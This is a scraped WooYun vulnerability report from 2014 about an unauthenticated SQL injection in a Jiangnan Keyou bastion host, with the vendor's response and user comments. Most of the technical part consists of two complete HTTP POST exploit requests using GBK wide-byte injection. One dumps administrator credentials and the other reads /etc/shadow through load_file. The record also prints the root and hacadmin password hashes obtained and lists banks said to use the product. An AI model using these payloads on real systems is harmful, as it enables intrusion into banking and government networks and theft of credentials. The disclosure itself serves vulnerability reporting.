{"id": 1633, "wybug_id": "wooyun-2014-063604", "wybug_title": "江南科友堡垒机全版本getshell（无需登录）", "wybug_corp": "江南科友", "wybug_author": "路人甲", "wybug_date": "2014-06-05 08:17", "wybug_open_date": "2014-09-03 08:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向公众公开  简要描述： 江南科友堡垒机一键取系统管理员账号，一键读shadow，一键。。。。 详细说明：  江南科友堡垒机全版本getshell（无需登录）#1 漏洞设计客户如下：国内各大银行：中国银行、民生银行、广东发展银行、平安银行、深圳发展银行、浦发银行、渤海银行总行及各分行、中国工商银行、中国农业银行、中国建设银行、交通银行、招商银行、中信银行、兴业银行、华夏银行、中国邮政储蓄银行总行或部分分行中国银联：总公司及北京、广州、深圳、南京、福州、长沙、武汉、济南、青岛、沈阳、郑州、海口、天津、香港、厦门等分公司银联数据：全国卡系统业务托管商业银行外资银行：渣打银行、东亚银行：全国境内各个分行外资金融机构：韩亚银行、花旗银行、通用电气、星展银行、美国第一资讯（FDC)地方商业银行及农村信用社：40余家商业银行及农村信用社社会保障与公共交通系统：湖北、黑龙江、广东、北京等社保卡安全系统，上海市公交一卡通安全系统，杭州市市民卡系统，长春一汽企业IC卡加密系统，宁波市民卡系统，郑州交通一卡通系统，山东一卡通系统（摘自官网：http://www.keyou.cn/JN_case/case-cg.aspx）请自查....另外一参数由于GBK 宽字节注入。。。如图。。。#exp如下：\nPOST /login.php HTTP/1.0Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: https://xxxxx/login.phpAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; Media Center PC 6.0; .NET4.0E)Content-Type: application/x-www-form-urlencodedHost: 22.122.133.xxContent-Length: 239DNT: 1Connection: Keep-AlivePragma: no-cacheCookie: PHPSESSID=5286a545e2c80bc0a0e5364a1995e337password_check=1&username=aaa%cf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))b)c)#\n关键exp:\nExp如下：（无需登录）+and+exists(select*from+(select*from(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,password)+from+manager+limit+0,1),0))b)c)\n堡垒机系统管理员 账号和密码出来了。。。\n\n密码直接md5加密，解密之\n\n\n二、直接读root密码POST /login.php HTTP/1.0Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: https://xxx/login.phpAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; Media Center PC 6.0; .NET4.0E)Content-Type: application/x-www-form-urlencodedHost: xxxContent-Length: 319DNT: 1Connection: Keep-AlivePragma: no-cacheCookie: PHPSESSID=5286a545e2c80bc0a0e5364a1995e337password_check=1&account=aaa%cf'+and+1=2+union+select+1+from+(select+count(*),concat(floor(rand(0)*2),(Select concat(substring(load_file(0x2F6574632F736861646F77),1,64)) FROM manager limit 0,1))a+from+information_schema.tables+group+by+a)b##&password=bbb&usb_code=&certcn=&randvalue=1953854457&notifypwd=&ac=&timeout=\n\n\nroot 账号hash值也出来了hacadmin:$1$Z.XpkqIQ$wOkNmpwm/DkmgDNUbruhr0root:$1$nd7FWMB8$IW4Op2tuiXWxWDUhoEhSP/:13935:0:99999:7:::作为安全厂商，自身产品都有问题，能切实保障客户安全吗？ 并且自身堡垒机本身就是审计产品，在大量政府、银行、金融、能源等重要部门都有应用，一旦自身有安全漏洞，造成堡垒机上面所有服务器都会出现较大问题。。应反思。。。   漏洞证明：  \n\nroot 账号hash值也出来了hacadmin:$1$Z.XpkqIQ$wOkNmpwm/DkmgDNUbruhr0root:$1$nd7FWMB8$IW4Op2tuiXWxWDUhoEhSP/:13935:0:99999:7:::   修复方案：  更换编码格式，或者过滤都行...最好审计下自身产品也行，到时候别自身产品shell一堆一堆的。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-06-09 22:24 厂商回复： CNVD未直接确认（内网网络前提），已经由CNVD直接转报给设备生产厂商——江南科友公司，向renhc  任工通报。rank 19 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-05 08:47 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  江南科友堡垒机一键取系统管理员账号，一键读shadow，一键。。。。    \n     2014-06-05 08:47 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  会开放在外网吗？    \n     2014-06-05 09:05 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯子 应该内网多一些    \n     2014-06-05 10:18 |    \t\tFakehac \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | 菜鸟刚来，努力挖洞洞。。。)\t\t \n  getshell  牛x    \n     2014-07-02 11:13 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个如何确定是全版本？我觉得确定不了啊。而且标题写的getshell好像没看见shell……    \n     2014-09-03 09:10 |    \t\t小r00to1 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:42        )\t\t \n  很少有堡垒机暴露在外网吧，可以作为拿下内网的手段，破了堡垒机，破了一切！    \n     2014-09-03 10:38 |    \t\tAndy_ \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:7        | 中行打酱油第一人！！)\t\t \n  金融企业网络管控很严的，堡垒机况且都不会在暴露在外网，能够进入金融企业的内部网络很难，但是，如果内部人员得知这个漏洞想搞破坏那就爽歪歪了，如果由企业把堡垒机暴露在外网，那我就XXX。。这个企业。    \n     2014-09-03 12:12 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  没有分析…    \n     2014-09-04 22:09 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  牛    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}